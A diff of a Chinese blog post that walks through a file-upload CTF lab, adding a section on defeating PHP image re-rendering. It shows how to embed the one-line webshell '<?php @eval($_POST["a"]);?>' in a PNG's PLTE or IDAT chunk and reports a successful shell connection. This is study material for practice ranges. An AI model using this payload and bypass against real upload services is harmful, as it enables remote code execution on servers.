@@ -9,7 +9,7 @@
 <meta property='og:description' content='File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue'>
 <meta property='og:url' content='https://ginkgo.org.cn/posts/file_upload_ggctf_upload/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='file_upload' /><meta property='article:tag' content='security' /><meta property='article:tag' content='server_side_vul' /><meta property='article:published_time' content='2022-04-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-01T13:05:57&#43;01:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='file_upload' /><meta property='article:tag' content='security' /><meta property='article:tag' content='server_side_vul' /><meta property='article:published_time' content='2022-04-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-01T22:58:53&#43;01:00'/>
 <meta name="twitter:title" content="File Upload: ggctf-upload">
 <meta name="twitter:description" content="File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue">
     <link rel="shortcut icon" href="/img/favicon.ico" />
@@ -261,7 +261,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    8 minute read
+                    11 minute read
                 </time>
             </div>
         
@@ -616,7 +616,126 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <p><figure><img src="/ox-hugo/2022-04-30_17-17-20_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
-
+<h4 id="png">PNG</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/png&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">         <span class="c1">//使
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//给新图片指定文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.png&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<ul>
+<li>
+<p>前置知识</p>
+<p>在介绍两种写入php一句话木马到PNG图片的方法之前，我们先来了解一下PNG图片的组成，参考janes师傅的文章：<a class="link" href="http://drops.xmd5.com/static/drops/tips-16034.html"  target="_blank" rel="noopener"
+    >php imagecreatefrom* 系列函数之 png</a> <!-- raw HTML omitted --></p>
+<p>PNG 图片有三种图像模式：索引彩色图像(index-color images)，灰度图像(grayscale images)，真彩色图像(true-color images), 其中索引彩色图像也称为基于调色板图像(Palette-based images)。不同的图片模式主要是包含的信息，展现的图像不一样（色彩？） <!-- raw HTML omitted --></p>
+<p>一个PNG文件油一个 <code>png signature</code> 以及多个 <code>png chunk</code> 组成 <!-- raw HTML omitted --></p>
+<p>PNG signature: png 标识
+: 我们之前提到过的，用来指示文件格式的头部，8bites <!-- raw HTML omitted -->
+89 50 4E 47 OD 0A 1A 0A <!-- raw HTML omitted --></p>
+<p>PNG chunk: png 数据块
+: PNG chunk又分为两种 <!-- raw HTML omitted -->
+-   关键数据块(critical chunk)，标准数据块： <code>IHDR, IDAT, IEND</code> <!-- raw HTML omitted -->
+-   辅助数据块(ancillary chunks), 可选数据库： <code>PLTE</code> <!-- raw HTML omitted --></p>
+<p>PNG 数据块结构
+: png数据块由四个部分组成： <!-- raw HTML omitted -->
+1.  length: 4 bytes <!-- raw HTML omitted -->
+2.  type: 4 bytes <!-- raw HTML omitted -->
+3.  data <!-- raw HTML omitted -->
+4.  CRC: 4bytes <!-- raw HTML omitted --></p>
+<p>接下来我们再简单介绍一些上面提到的标准数据块的作用，详细的信息可以参考文章或者参考更加专业的文档 <!-- raw HTML omitted --></p>
+<p>IHDR
+: 文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中 <!-- raw HTML omitted -->只能有一个文件头数据块<!-- raw HTML omitted --> 。 <!-- raw HTML omitted --></p>
+<p>PLTE
+: 调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。 <!-- raw HTML omitted --></p>
+<p>IDAT
+: 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像 <!-- raw HTML omitted -->真正的数据信息<!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<p>IEND
+: 图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。 <!-- raw HTML omitted --></p>
+<p>根据文章的实验，只能向索引彩色图像(index-color images)的PLTE数据块插入php代码，其他都会被 <code>imagecreatefrompng</code> 渲染失效 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>写入 <code>PLTE</code> 数据块</p>
+<p><figure><img src="/ox-hugo/png_trojan.png" width="100px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-01_21-53-41_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">convert png.png -type Palette png_trojan.png
+</span></span></code></pre></div><p>之后使用<a class="link" href="https://github.com/hxer/imagecreatefrom-"  target="_blank" rel="noopener"
+    >脚本</a>来进行一句话木马的输入 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 poc_png.py -p <span class="s1">&#39;&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;&#39;</span> -o png_trojan.png png_trojan.png
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-01_22-42-09_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>尝试上传 <!-- raw HTML omitted --></p>
+<p>查看二次渲染后的图片，发现一句话木马插入成功，蚁剑连接成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-01_22-41-51_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>写入IDAT数据块</p>
+<p>利用脚本， <!-- raw HTML omitted --></p>
+<p>下载二次渲染之后的图片，检查一句话木马 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-01_22-52-43_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>shell利用成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-01_22-58-39_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<h4 id="jpg">JPG</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                     <span class="c1">//使用上传的图片生成新的图片
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="c1">//给新图片指定文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="nx">imagejpeg</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span></code></pre></div>
 </section>
 
 
@@ -655,7 +774,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 
 
         <span>
-            Last updated on May 01, 2022 13:05 BST
+            Last updated on May 01, 2022 22:58 BST
         </span>
     </section></footer>
 
@@ -903,6 +1022,8 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
         <li><a href="#二次渲染">二次渲染</a>
           <ul>
             <li><a href="#gif">GIF</a></li>
+            <li><a href="#png">PNG</a></li>
+            <li><a href="#jpg">JPG</a></li>
           </ul>
         </li>
       </ul>
